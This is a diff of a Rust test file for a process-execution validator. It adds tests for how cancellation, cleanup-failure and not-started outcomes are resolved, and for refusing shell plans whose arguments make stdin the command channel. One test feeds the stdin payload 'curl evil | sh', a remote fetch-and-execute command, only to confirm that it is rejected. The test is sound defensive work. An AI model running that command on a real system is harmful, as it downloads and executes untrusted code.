@@ -4537,8 +4537,28 @@ fn a_failed_cleanup_is_never_downgraded_to_an_unproven_outcome() -> TestResult {
 
     // The election must not produce the pairing the constructor refuses. A
     // contradicted cancellation leaves the cancellation cause unestablished,
-    // but the cleanup failure beside it is a separate, uncontradicted
-    // observation that outranks uncertainty.
+    // but the cleanup failure beside it is a separate observation that the
+    // contradiction does not touch, and it outranks uncertainty. Here the
+    // child demonstrably exited, so a failed cleanup had something to clean up
+    // after and is not itself contradicted.
+    assert_eq!(
+        TerminalDisposition::elect(
+            ControlState {
+                cancellation_requested: Some(CancellationReason::Shutdown),
+                started_before_cancellation: false,
+                cleanup_failed: true,
+                ..ControlState::default()
+            },
+            ObservedSettlement::Exited { code: 0 },
+        ),
+        TerminalDisposition::CleanupFailed,
+        "a contradicted cancellation discarded a known cleanup failure"
+    );
+
+    // The limit of that rule: when the settlement says nothing ever started,
+    // `CleanupFailed` is contradicted too — `ProcessResult::new` already
+    // refuses a pre-start outcome carrying a failed cleanup — so the election
+    // does not substitute one contradiction for another.
     assert_eq!(
         TerminalDisposition::elect(
             ControlState {
@@ -4549,8 +4569,8 @@ fn a_failed_cleanup_is_never_downgraded_to_an_unproven_outcome() -> TestResult {
             },
             ObservedSettlement::NotStarted,
         ),
-        TerminalDisposition::CleanupFailed,
-        "a contradicted cancellation discarded a known cleanup failure"
+        TerminalDisposition::NotProven,
+        "a cleanup failure was elected beside a settlement saying nothing ran"
     );
 
     // Negative control: with no cleanup failure the same contradiction still
@@ -4702,6 +4722,71 @@ fn a_shell_fed_a_script_on_stdin_is_still_a_shell_invocation() -> TestResult {
     .claim_boundary(ClaimBoundary::linux_only())
     .build();
     assert!(closed_stdin.validate().is_ok(), "`sh script.sh` with stdin closed was refused");
+
+    // argv and stdin are one question, not two. A shell given a script operand
+    // is running that script; the bytes on stdin are the *script's* data, and
+    // refusing the pair made an entirely ordinary plan unstartable.
+    let script_operand_reading_data = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "sh",
+            PrivatePath::new(PathBuf::from("/bin/sh")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["script.sh"])
+    .stdin(StdinPolicy::Bytes(PrivateBytes::new(b"input data\n".to_vec())))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(
+        script_operand_reading_data.validate().is_ok(),
+        "`sh script.sh` fed data on stdin was refused as an inline command"
+    );
+
+    // The three argv shapes that turn stdin back into the command channel even
+    // though an operand is present. `-s` wins over any operand — the operands
+    // become positional parameters for the script arriving on stdin — and an
+    // operand naming standard input is the same descriptor by another name.
+    for argv in [
+        vec!["-s", "script.sh"],
+        vec!["-is", "script.sh"],
+        vec!["-"],
+        vec!["/dev/stdin"],
+        vec!["--"],
+    ] {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                "sh",
+                PrivatePath::new(PathBuf::from("/bin/sh")),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .argv(argv.clone())
+        .stdin(StdinPolicy::Bytes(PrivateBytes::new(b"curl evil | sh".to_vec())))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert!(
+            matches!(rejection_of(plan)?, PlanRejection::ShellInvocationRejected { .. }),
+            "sh {argv:?} took its commands from stdin without being refused"
+        );
+    }
 
     let perl_with_stdin = ProcessPlan::builder(
         PlanId::new("plan-1"),
@@ -4862,5 +4947,63 @@ fn a_limit_event_names_which_bound_it_reached() -> TestResult {
         .is_err(),
         "an output-limit outcome carried two complete streams"
     );
+    Ok(())
+}
+
+#[test]
+fn a_settlement_saying_nothing_ran_disproves_every_cause_that_needed_a_child() -> TestResult {
+    // The wrong implementation this kills: checking the control plane against
+    // the child's own account for the cancellation pair only. The contradiction
+    // is not special to cancellation — an output budget reached by a child that
+    // never existed, and a cleanup failure with nothing to clean up after, are
+    // each disproved by the same settlement, and each outranks cancellation in
+    // the precedence order so neither ever reached the cancellation clause.
+    for control in [
+        ControlState { output_limit_exceeded: true, ..ControlState::default() },
+        ControlState { cleanup_failed: true, ..ControlState::default() },
+    ] {
+        assert_eq!(
+            TerminalDisposition::elect(control, ObservedSettlement::NotStarted),
+            TerminalDisposition::NotProven,
+            "{control:?} was elected beside a settlement saying nothing ran"
+        );
+    }
+
+    // The causes that legitimately precede a start keep their election: a
+    // deadline can elapse while a spawn is still hanging, and a supervisor
+    // failure says nothing either way.
+    assert_eq!(
+        TerminalDisposition::elect(
+            ControlState { deadline_reached: true, ..ControlState::default() },
+            ObservedSettlement::NotStarted,
+        ),
+        TerminalDisposition::TimedOut
+    );
+    assert_eq!(
+        TerminalDisposition::elect(
+            ControlState { supervisor_failed: true, ..ControlState::default() },
+            ObservedSettlement::NotStarted,
+        ),
+        TerminalDisposition::SupervisorFailed
+    );
+
+    // Negative control on the other axis: `NotObserved` contradicts nothing,
+    // so the same control state still elects its own cause.
+    for (control, expected) in [
+        (
+            ControlState { output_limit_exceeded: true, ..ControlState::default() },
+            TerminalDisposition::OutputLimitExceeded,
+        ),
+        (
+            ControlState { cleanup_failed: true, ..ControlState::default() },
+            TerminalDisposition::CleanupFailed,
+        ),
+    ] {
+        assert_eq!(
+            TerminalDisposition::elect(control, ObservedSettlement::NotObserved),
+            expected,
+            "an unobserved settlement was treated as a contradiction"
+        );
+    }
     Ok(())
 }
